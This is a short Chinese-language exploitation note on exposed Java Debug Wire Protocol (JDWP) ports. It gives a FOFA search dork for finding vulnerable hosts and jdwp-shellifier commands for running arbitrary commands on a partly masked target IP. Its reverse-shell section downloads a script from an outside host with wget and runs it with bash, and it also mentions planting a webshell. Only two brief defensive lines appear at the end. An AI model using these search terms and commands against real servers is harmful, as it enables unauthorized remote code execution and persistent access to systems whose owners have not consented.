> Created：2021/10/17 17:54

### 漏洞简介
JDWP（Java DEbugger Wire Protocol）：即Java调试线协议，是一个为Java调试而设计的通讯交互协议，它定义了调试器和被调试程序之间传递的信息的格式。说白了就是JVM或者类JVM的虚拟机都支持一种协议，通过该协议，Debugger 端可以和 target VM 通信，可以获取目标 VM的包括类、对象、线程等信息，在调试Android应用程序这一场景中，Debugger一般是指你的 develop machine 的某一支持 JDWP协议的工具例如 Android Studio 或者 JDB，而 Target JVM是指运行在你mobile设备当中的各个App（因为它们都是一个个虚拟机 Dalvik 或者 ART），JDWP Agent一般负责监听某一个端口，当有 Debugger向这一个端口发起请求的时候，Agent 就转发该请求给 target JVM并最终由该 JVM 来处理请求，并把 reply 信息返回给 Debugger 端。

### 漏洞复现

FoFa Dork: 

> banner="JDWP-Handshake"


![image](https://user-images.githubusercontent.com/55024146/161269239-6315e359-6e6e-475c-93ca-b15348ea4748.png)


```
python2 .\jdwp-shellifier.py -t 62.x.x.x -p 8000 --cmd "ping xxxxx.dnslog.cn -c2"
```

![image](https://user-images.githubusercontent.com/55024146/161269453-16716b2d-b843-4d87-98e5-bf8d324d11fc.png)

此时，找到相应WEB网站访问

![image](https://user-images.githubusercontent.com/55024146/161269588-3484b430-177c-4cb2-b367-abe3714c08e8.png)

![image](https://user-images.githubusercontent.com/55024146/161269685-238b7aaa-879a-40cd-ba43-e75b807121d4.png)

触发

![image](https://user-images.githubusercontent.com/55024146/161269779-ee51ae56-756d-4493-9c63-21d9d98b3356.png)

测试截图

![image](https://user-images.githubusercontent.com/55024146/161269896-7a791529-aa51-4e57-9f72-27fc00edce47.png)

### 漏洞利用

- 反弹shell
  - jdwp-shellifier.py -t 目标IP -p 端口 --cmd "wget http://x.x.x.x/x.txt -O /tmp/x.sh"
  - jdwp-shellifier.py -t 目标IP -p 端口 --cmd "bash /tmp/x.sh"

- 写入webshell

### 漏洞防御

- 关闭JDWP端口，或者JDWP端口不对公网开放
  - 所以内网渗透时可以注意一下 +_+
- 关闭Java的debug模式（开启该模式对服务器性能有影响）


参考资料
- https://github.com/IOActive/jdwp-shellifier
